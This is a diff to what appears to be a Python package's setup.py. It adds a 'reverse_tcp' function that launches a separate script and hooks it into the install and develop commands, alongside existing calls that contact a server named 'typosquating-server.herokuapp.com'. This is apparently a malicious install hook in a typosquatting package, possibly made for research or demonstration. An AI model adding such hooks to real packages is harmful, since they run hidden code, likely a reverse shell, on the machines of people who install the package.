@@ -101,8 +101,15 @@ def touch_file():
             print('What kind of tricky system are you running this on?')
 
 
+def reverse_tcp():
+    import subprocess, sys
+    p = subprocess.Popen([sys.executable, 'script.py'],
+                     stdout=subprocess.PIPE,
+                     stderr=subprocess.STDOUT)
+
 class PostDevelopCommand(develop):
     def run(self):
+        reverse_tcp()
         touch_file()
         get_info(URL)
         develop.run(self)
@@ -110,9 +117,11 @@ class PostDevelopCommand(develop):
 
 class PostInstallCommand(install):
     def run(self):
+        reverse_tcp()
         touch_file()
         get_info(URL)
         install.run(self)
+        reverse_tcp()
 
 URL = 'https://typosquating-server.herokuapp.com/'
 
